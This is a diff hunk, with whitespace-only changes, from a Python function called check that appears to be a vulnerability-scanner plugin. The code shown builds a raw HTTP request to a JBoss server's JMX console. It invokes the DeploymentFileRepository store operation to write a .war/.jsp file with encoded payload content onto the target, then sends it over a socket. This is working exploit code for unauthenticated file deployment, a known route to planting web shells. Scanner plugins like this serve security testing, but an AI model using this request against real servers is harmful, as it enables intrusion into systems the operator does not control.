@@ -40,8 +40,8 @@ def check(host, port, timeout):
             shellcode += hex(ord(v)).replace("0x", "%")
         flag = "HEAD /jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=" + \
                "java.lang.String&arg0=%s.war&argType=java.lang.String&arg1=xunfeng&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=" % (
-               name) + shellcode + \
-               "&argType=boolean&arg4=True HTTP/1.0\r\n\r\n"
+                   name) + shellcode + \
+            "&argType=boolean&arg4=True HTTP/1.0\r\n\r\n"
         s1.send(flag)
         data = s1.recv(512)
         s1.close()
